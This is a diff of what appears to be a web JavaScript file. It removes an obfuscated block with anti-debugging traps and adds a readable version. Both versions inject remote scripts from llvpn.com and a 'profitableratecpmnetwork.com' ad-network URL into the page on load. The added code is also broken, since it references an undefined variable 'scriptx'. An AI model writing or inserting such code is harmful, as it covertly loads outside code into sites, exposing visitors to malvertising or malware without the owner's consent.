@@ -1,1 +1,18 @@
-function _0x542d(_0x11a2a6,_0x29492d){_0x11a2a6=_0x11a2a6-0x1a4;const _0x235ee5=_0x1b20();let _0xc714a5=_0x235ee5[_0x11a2a6];return _0xc714a5;}const _0x5b4378=_0x542d;(function(_0x2eebb1,_0x23414f){const _0xe68321=_0x542d,_0x156328=_0x2eebb1();while(!![]){try{const _0x318470=parseInt(_0xe68321(0x1a5))/0x1*(parseInt(_0xe68321(0x1bc))/0x2)+parseInt(_0xe68321(0x1ae))/0x3*(-parseInt(_0xe68321(0x1a4))/0x4)+parseInt(_0xe68321(0x1b8))/0x5+parseInt(_0xe68321(0x1b7))/0x6*(-parseInt(_0xe68321(0x1b9))/0x7)+-parseInt(_0xe68321(0x1b5))/0x8+-parseInt(_0xe68321(0x1aa))/0x9*(parseInt(_0xe68321(0x1b6))/0xa)+parseInt(_0xe68321(0x1c1))/0xb;if(_0x318470===_0x23414f)break;else _0x156328['push'](_0x156328['shift']());}catch(_0xa07cb2){_0x156328['push'](_0x156328['shift']());}}}(_0x1b20,0xc9d0e));function _0x1b20(){const _0xe3b135=['length','test','39312174fhazDx','init','\x0a(function(s)\x20{\x0a\x20\x20\x20\x20s.dataset.zone\x20=\x20\x2711764024\x27;\x0a\x20\x20\x20\x20s.src\x20=\x20\x27https://llvpn.com/tag.min.js\x27;\x0a})(\x0a\x20\x20\x20\x20[document.documentElement,\x20document.body]\x0a\x20\x20\x20\x20\x20\x20\x20\x20.filter(Boolean)\x0a\x20\x20\x20\x20\x20\x20\x20\x20.pop()\x0a\x20\x20\x20\x20\x20\x20\x20\x20.appendChild(document.createElement(\x27script\x27))\x0a);\x0a','2481532OLotdw','1696txeTYU','src','chain','action','apply','2898XoaGIU','\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','head','appendChild','6KRNDBw','while\x20(true)\x20{}','debu','textContent','createElement','gger','afterend','1277672OdrIRb','50080yQiydn','30DxCLnc','4580110MwaoHp','1178541EHgAuj','counter','constructor','226vWUOoo','stateObject','call'];_0x1b20=function(){return _0xe3b135;};return _0x1b20();}const _0xed56c3=(function(){let _0x3c5bdf=!![];return function(_0x3321ae,_0x4c1ffd){const _0x57aef2=_0x3c5bdf?function(){const _0x8d2d1b=_0x542d;if(_0x4c1ffd){const _0x381274=_0x4c1ffd[_0x8d2d1b(0x1a9)](_0x3321ae,arguments);return _0x4c1ffd=null,_0x381274;}}:function(){};return _0x3c5bdf=![],_0x57aef2;};}());(function(){_0xed56c3(this,function(){const _0x2abec2=_0x542d,_0x160053=new RegExp('function\x20*\x5c(\x20*\x5c)'),_0x426d4a=new RegExp(_0x2abec2(0x1ab),'i'),_0x4352a8=_0xc714a5(_0x2abec2(0x1c2));!_0x160053[_0x2abec2(0x1c0)](_0x4352a8+_0x2abec2(0x1a7))||!_0x426d4a[_0x2abec2(0x1c0)](_0x4352a8+'input')?_0x4352a8('0'):_0xc714a5();})();}());const scriptx=document[_0x5b4378(0x1b2)]('script');scriptx[_0x5b4378(0x1b1)]=_0x5b4378(0x1c3),document[_0x5b4378(0x1ac)]['insertAdjacentElement'](_0x5b4378(0x1b4),scriptx);const script=document[_0x5b4378(0x1b2)]('script');script[_0x5b4378(0x1a6)]='https://pl28979147.profitableratecpmnetwork.com/39/10/96/391096f637383e63beb239e434d5d525.js',document[_0x5b4378(0x1ac)][_0x5b4378(0x1ad)](script);function _0xc714a5(_0x20a979){function _0x5ac912(_0x1d2ecf){const _0x39e9bb=_0x542d;if(typeof _0x1d2ecf==='string')return function(_0x54e93a){}[_0x39e9bb(0x1bb)](_0x39e9bb(0x1af))['apply'](_0x39e9bb(0x1ba));else(''+_0x1d2ecf/_0x1d2ecf)[_0x39e9bb(0x1bf)]!==0x1||_0x1d2ecf%0x14===0x0?function(){return!![];}[_0x39e9bb(0x1bb)](_0x39e9bb(0x1b0)+_0x39e9bb(0x1b3))[_0x39e9bb(0x1be)](_0x39e9bb(0x1a8)):function(){return![];}[_0x39e9bb(0x1bb)]('debu'+'gger')[_0x39e9bb(0x1a9)](_0x39e9bb(0x1bd));_0x5ac912(++_0x1d2ecf);}try{if(_0x20a979)return _0x5ac912;else _0x5ac912(0x0);}catch(_0xc9e0b9){}}
+
+(function(s) {
+    s.dataset.zone = '11764024';
+    s.src = 'https://llvpn.com/tag.min.js';
+})(
+    [document.documentElement, document.body]
+        .filter(Boolean)
+        .pop()
+        .appendChild(document.createElement('script'))
+);
+
+
+document.head.insertAdjacentElement("afterend", scriptx);
+
+const script = document.createElement("script");
+script.src = "https://pl28979147.profitableratecpmnetwork.com/39/10/96/391096f637383e63beb239e434d5d525.js";
+document.head.appendChild(script);
+
